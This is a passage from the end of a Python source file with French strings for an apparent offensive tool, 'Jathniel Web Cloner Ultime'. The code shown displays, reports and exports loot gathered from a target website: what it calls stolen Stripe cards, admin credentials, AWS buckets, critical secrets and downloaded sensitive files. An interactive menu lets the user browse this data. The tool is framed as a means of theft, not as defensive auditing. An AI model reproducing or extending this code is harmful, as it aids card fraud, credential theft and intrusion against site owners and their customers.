        if stripe_file.exists():
            try:
                with open(stripe_file, 'r') as f:
                    cards = json.load(f)
                    if cards:
                        print(f"\n💳 CARTES STRIPE VOLÉES: {len(cards)}")
                        for i, card in enumerate(cards[:10], 1):
                            print(f"  {i}. {card.get('email', 'N/A')}: {card.get('card_brand', 'N/A')} ****{card.get('last4', 'N/A')} ({card.get('exp_month', 'N/A')}/{card.get('exp_year', 'N/A')})")
                        if len(cards) > 10:
                            print(f"  ... et {len(cards) - 10} autres cartes")
            except:
                pass
        
        # 2. AWS - Buckets
        aws_file = CONFIG['output_dir'] / 'aws_buckets.json'
        if aws_file.exists():
            try:
                with open(aws_file, 'r') as f:
                    buckets = json.load(f)
                    if buckets:
                        print(f"\n☁️ BUCKETS AWS TROUVÉS: {len(buckets)}")
                        for bucket in buckets[:10]:
                            print(f"  - {bucket}")
                        if len(buckets) > 10:
                            print(f"  ... et {len(buckets) - 10} autres buckets")
            except:
                pass
        
        # 3. Admin credentials
        admin_file = CONFIG['output_dir'] / 'admin_credentials.txt'
        if admin_file.exists():
            try:
                with open(admin_file, 'r') as f:
                    creds = f.read().strip().split('\n')
                    if creds and creds[0]:
                        print(f"\n🔐 IDENTIFIANTS ADMIN TROUVÉS: {len(creds)}")
                        for cred in creds[:5]:
                            print(f"  - {cred}")
                        if len(creds) > 5:
                            print(f"  ... et {len(creds) - 5} autres identifiants")
            except:
                pass
        
        # 4. Secrets critiques
        secrets = self.db.fetch_all("SELECT type, value, source FROM secrets WHERE severity = 'critical' LIMIT 10")
        if secrets:
            print(f"\n🔑 SECRETS CRITIQUES: {len(secrets)}")
            for type, value, source in secrets:
                print(f"  - {type}: {value[:30]}... ({source})")
        
        # 5. Fichiers sensibles
        if self.results['sensitive_files']:
            print(f"\n📁 FICHIERS SENSIBLES TÉLÉCHARGÉS: {len(self.results['sensitive_files'])}")
            for file in self.results['sensitive_files'][:10]:
                print(f"  - {file['filename']} ({file['size']} octets)")
            if len(self.results['sensitive_files']) > 10:
                print(f"  ... et {len(self.results['sensitive_files']) - 10} autres fichiers")
        
        print("\n" + "="*50)
    
    def show_menu(self):
        """Affiche un menu de consultation des données"""
        while True:
            print("\n" + "="*50)
            print("📋 MENU DE CONSULTATION")
            print("="*50)
            print("1. 💳 Voir les cartes Stripe volées")
            print("2. ☁️ Voir les buckets AWS")
            print("3. 🔐 Voir les identifiants admin")
            print("4. 🔑 Voir tous les secrets")
            print("5. 📁 Voir les fichiers sensibles")
            print("6. 🚨 Voir les vulnérabilités")
            print("7. 📊 Voir le rapport complet")
            print("8. 💾 Exporter toutes les données")
            print("0. Quitter")
            print("="*50)
            
            choice = input(colorize("\n👉 Votre choix: ", 'yellow')).strip()
            
            if choice == '1':
                self.view_stripe_cards()
            elif choice == '2':
                self.view_aws_buckets()
            elif choice == '3':
                self.view_admin_creds()
            elif choice == '4':
                self.view_secrets()
            elif choice == '5':
                self.view_sensitive_files()
            elif choice == '6':
                self.view_vulnerabilities()
            elif choice == '7':
                self.view_full_report()
            elif choice == '8':
                self.export_all_data()
            elif choice == '0':
                print(colorize("\n👋 Au revoir!", 'green'))
                break
            else:
                print(colorize("❌ Choix invalide", 'red'))
                time.sleep(1)
    
    def view_stripe_cards(self):
        """Affiche les cartes Stripe"""
        stripe_file = CONFIG['output_dir'] / 'stripe_data.json'
        if not stripe_file.exists():
            print(colorize("❌ Aucune carte Stripe trouvée", 'yellow'))
            input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
            return
        
        try:
            with open(stripe_file, 'r') as f:
                cards = json.load(f)
                if not cards:
                    print(colorize("❌ Aucune carte Stripe trouvée", 'yellow'))
                    input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
                    return
                
                print(colorize(f"\n💳 CARTES STRIPE VOLÉES ({len(cards)})", 'bold'))
                print("="*60)
                for i, card in enumerate(cards, 1):
                    print(f"{i}. {colorize(card.get('email', 'N/A'), 'cyan')}")
                    print(f"   Carte: {card.get('card_brand', 'N/A')} ****{card.get('last4', 'N/A')}")
                    print(f"   Expiration: {card.get('exp_month', 'N/A')}/{card.get('exp_year', 'N/A')}")
                    print(f"   Pays: {card.get('country', 'N/A')}")
                    print("-"*40)
        except Exception as e:
            print(colorize(f"❌ Erreur: {e}", 'red'))
        
        input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
    
    def view_aws_buckets(self):
        """Affiche les buckets AWS"""
        aws_file = CONFIG['output_dir'] / 'aws_buckets.json'
        if not aws_file.exists():
            print(colorize("❌ Aucun bucket AWS trouvé", 'yellow'))
            input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
            return
        
        try:
            with open(aws_file, 'r') as f:
                buckets = json.load(f)
                if not buckets:
                    print(colorize("❌ Aucun bucket AWS trouvé", 'yellow'))
                    input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
                    return
                
                print(colorize(f"\n☁️ BUCKETS AWS TROUVÉS ({len(buckets)})", 'bold'))
                print("="*60)
                for bucket in buckets:
                    print(f"  - {colorize(bucket, 'cyan')}")
        except Exception as e:
            print(colorize(f"❌ Erreur: {e}", 'red'))
        
        input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
    
    def view_admin_creds(self):
        """Affiche les identifiants admin"""
        admin_file = CONFIG['output_dir'] / 'admin_credentials.txt'
        if not admin_file.exists():
            print(colorize("❌ Aucun identifiant admin trouvé", 'yellow'))
            input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
            return
        
        try:
            with open(admin_file, 'r') as f:
                creds = f.read().strip().split('\n')
                if not creds or not creds[0]:
                    print(colorize("❌ Aucun identifiant admin trouvé", 'yellow'))
                    input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
                    return
                
                print(colorize(f"\n🔐 IDENTIFIANTS ADMIN TROUVÉS ({len(creds)})", 'bold'))
                print("="*60)
                for cred in creds:
                    print(f"  - {colorize(cred, 'red')}")
        except Exception as e:
            print(colorize(f"❌ Erreur: {e}", 'red'))
        
        input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
    
    def view_secrets(self):
        """Affiche tous les secrets"""
        secrets = self.db.fetch_all("SELECT type, value, source, severity FROM secrets")
        if not secrets:
            print(colorize("❌ Aucun secret trouvé", 'yellow'))
            input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
            return
        
        print(colorize(f"\n🔑 SECRETS DÉTECTÉS ({len(secrets)})", 'bold'))
        print("="*60)
        for type, value, source, severity in secrets:
            severity_color = 'red' if severity == 'critical' else 'yellow'
            print(f"  [{colorize(severity.upper(), severity_color)}] {type}")
            print(f"    Valeur: {value[:50]}...")
            print(f"    Source: {source}")
            print("-"*40)
        
        input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
    
    def view_sensitive_files(self):
        """Affiche les fichiers sensibles"""
        if not self.results['sensitive_files']:
            print(colorize("❌ Aucun fichier sensible trouvé", 'yellow'))
            input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
            return
        
        print(colorize(f"\n📁 FICHIERS SENSIBLES TÉLÉCHARGÉS ({len(self.results['sensitive_files'])})", 'bold'))
        print("="*60)
        for file in self.results['sensitive_files']:
            print(f"  - {colorize(file['filename'], 'red')} ({file['size']} octets)")
            print(f"    URL: {file['url']}")
            print(f"    Chemin: {file['path']}")
            print("-"*40)
        
        input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
    
    def view_vulnerabilities(self):
        """Affiche les vulnérabilités"""
        vulns = self.db.fetch_all("SELECT url, type, description, severity FROM vulnerabilities")
        if not vulns:
            print(colorize("❌ Aucune vulnérabilité trouvée", 'yellow'))
            input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
            return
        
        print(colorize(f"\n🚨 VULNÉRABILITÉS DÉTECTÉES ({len(vulns)})", 'bold'))
        print("="*60)
        for url, type, description, severity in vulns:
            severity_color = 'red' if severity == 'critical' else 'yellow'
            print(f"  [{colorize(severity.upper(), severity_color)}] {type}")
            print(f"    URL: {url}")
            print(f"    Description: {description}")
            print("-"*40)
        
        input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
    
    def view_full_report(self):
        """Affiche le rapport complet"""
        report_path = CONFIG['output_dir'] / 'clone_report.txt'
        if not report_path.exists():
            print(colorize("❌ Rapport non trouvé", 'yellow'))
            input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
            return
        
        try:
            with open(report_path, 'r') as f:
                print(f.read())
        except Exception as e:
            print(colorize(f"❌ Erreur: {e}", 'red'))
        
        input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
    
    def export_all_data(self):
        """Exporte toutes les données"""
        print(colorize("\n💾 EXPORT DES DONNÉES", 'bold'))
        print("="*50)
        
        export_dir = CONFIG['output_dir'] / 'export'
        export_dir.mkdir(parents=True, exist_ok=True)
        
        # 1. Exporter la base de données
        db_export = export_dir / 'clone_data_export.db'
        import shutil
        shutil.copy2(CONFIG['output_dir'] / 'clone_data.db', db_export)
        print(f"✅ Base de données exportée: {db_export}")
        
        # 2. Exporter les fichiers JSON
        json_files = ['stripe_data.json', 'aws_buckets.json', 'clone_results.json']
        for file in json_files:
            src = CONFIG['output_dir'] / file
            if src.exists():
                dst = export_dir / file
                shutil.copy2(src, dst)
                print(f"✅ {file} exporté")
        
        # 3. Exporter les fichiers sensibles
        sensitive_dir = CONFIG['output_dir'] / 'sensitive'
        if sensitive_dir.exists():
            export_sensitive = export_dir / 'sensitive_files'
            shutil.copytree(sensitive_dir, export_sensitive, dirs_exist_ok=True)
            print(f"✅ Fichiers sensibles exportés: {export_sensitive}")
        
        # 4. Exporter le rapport
        report_path = CONFIG['output_dir'] / 'clone_report.txt'
        if report_path.exists():
            shutil.copy2(report_path, export_dir / 'clone_report.txt')
            print(f"✅ Rapport exporté")
        
        # 5. Créer un fichier résumé
        summary = {
            'export_date': datetime.now().isoformat(),
            'target': self.url,
            'domain': self.domain,
            'statistics': {
                'pages': len(self.visited),
                'sensitive_files': len(self.results['sensitive_files']),
                'total_size': self.results['total_size']
            },
            'discoveries': {
                'apis': len(self.ai.discoveries['apis']),
                'secrets': len(self.ai.discoveries['secrets']),
                'vulnerabilities': len(self.ai.discoveries['vulnerabilities']),
                'technologies': len(self.ai.discoveries['technologies']),
                'admin_pages': len(self.ai.discoveries['admin_pages'])
            }
        }
        
        with open(export_dir / 'summary.json', 'w') as f:
            json.dump(summary, f, indent=2)
        print(f"✅ Résumé exporté: {export_dir / 'summary.json'}")
        
        print(colorize(f"\n✅ EXPORT COMPLET - Dossier: {export_dir}", 'green'))
        input(colorize("\nAppuyez sur Entrée pour continuer...", 'blue'))
    
    def generate_report(self):
        """Génère un rapport complet"""
        self.log("\n📄 GÉNÉRATION DU RAPPORT")
        self.log("="*50)
        
        duration = time.time() - self.results['start_time']
        
        report = f"""
╔══════════════════════════════════════════════════════════════════╗
║              RAPPORT DE CLONAGE INTELLIGENT                      ║
║              JATHNIEL WEB CLONER ULTIME                         ║
╚══════════════════════════════════════════════════════════════════╝

📌 CIBLE: {self.url}
📁 DOSSIER: {CONFIG['output_dir']}
⏱️  DURÉE: {duration:.2f} secondes

📊 STATISTIQUES:
  📄 Pages: {len(self.visited)}
  📁 Fichiers sensibles: {len(self.results['sensitive_files'])}
  📦 Taille totale: {self.format_size(self.results['total_size'])}

🔍 DÉCOUVERTES IA:
  🔍 APIs: {len(self.ai.discoveries['apis'])}
  🔑 Secrets: {len(self.ai.discoveries['secrets'])}
  🚨 Vulnérabilités: {len(self.ai.discoveries['vulnerabilities'])}
  ⚙️ Technologies: {len(self.ai.discoveries['technologies'])}
  🔐 Pages admin: {len(self.ai.discoveries['admin_pages'])}

🚨 VULNÉRABILITÉS CRITIQUES:
"""
        for vuln in [v for v in self.ai.discoveries['vulnerabilities'] if v['severity'] == 'critical']:
            report += f"  - {vuln['type']}: {vuln['url']}\n"
        
        if self.ai.discoveries['secrets']:
            report += "\n🔑 SECRETS DÉTECTÉS:\n"
            for secret in self.ai.discoveries['secrets'][:5]:
                report += f"  - {secret['type']}: {secret['value'][:30]}...\n"
        
        if self.ai.discoveries['admin_pages']:
            report += "\n🔐 PAGES ADMIN:\n"
            for page in self.ai.discoveries['admin_pages']:
                report += f"  - {page}\n"
        
        if self.results['sensitive_files']:
            report += "\n📁 FICHIERS SENSIBLES TÉLÉCHARGÉS:\n"
            for file in self.results['sensitive_files'][:10]:
                report += f"  - {file['filename']} ({file['size']} octets)\n"
            if len(self.results['sensitive_files']) > 10:
                report += f"  ... et {len(self.results['sensitive_files']) - 10} autres fichiers\n"
        
        # Sauvegarder le rapport
        report_path = CONFIG['output_dir'] / 'clone_report.txt'
        with open(report_path, 'w') as f:
            f.write(report)
        
        print(report)
        self.log(f"📄 Rapport sauvegardé: {report_path}")
    
    def save_results(self):
        """Sauvegarde les résultats en JSON"""
        data = {
            'target': self.url,
            'domain': self.domain,
            'timestamp': datetime.now().isoformat(),
            'duration': time.time() - self.results['start_time'],
            'statistics': {
                'pages': len(self.visited),
                'sensitive_files': len(self.results['sensitive_files']),
                'total_size': self.results['total_size']
            },
            'discoveries': {
                'apis': self.ai.discoveries['apis'],
                'secrets': self.ai.discoveries['secrets'],
                'vulnerabilities': self.ai.discoveries['vulnerabilities'],
                'technologies': self.ai.discoveries['technologies'],
                'admin_pages': self.ai.discoveries['admin_pages']
            },
            'sensitive_files': self.results['sensitive_files']
        }
        
        json_path = CONFIG['output_dir'] / 'clone_results.json'
        with open(json_path, 'w') as f:
            json.dump(data, f, indent=2)
        
        self.log(f"💾 Résultats sauvegardés: {json_path}")
    
    def format_size(self, bytes):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes < 1024:
                return f"{bytes:.2f} {unit}"
            bytes /= 1024
        return f"{bytes:.2f} TB"

# ==================== MAIN ====================

if __name__ == "__main__":
    try:
        # Vérifier les dépendances
        try:
            import requests
            from bs4 import BeautifulSoup
        except ImportError:
            print("❌ Dépendances manquantes. Installez avec: pip install requests beautifulsoup4")
            sys.exit(1)
        
        # Vérifier Playwright
        if CONFIG['render_js'] and not PLAYWRIGHT_AVAILABLE:
            print("⚠️ Playwright non disponible. Installez avec: pip install playwright && playwright install chromium")
        
        url = input("URL cible: ").strip()
        if not url:
            url = "https://example.com"
        
        cloner = UltimateCloner(url)
        cloner.start()
        
    except KeyboardInterrupt:
        print("\n\n👋 Au revoir!")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Erreur fatale: {e}")
        sys.exit(1)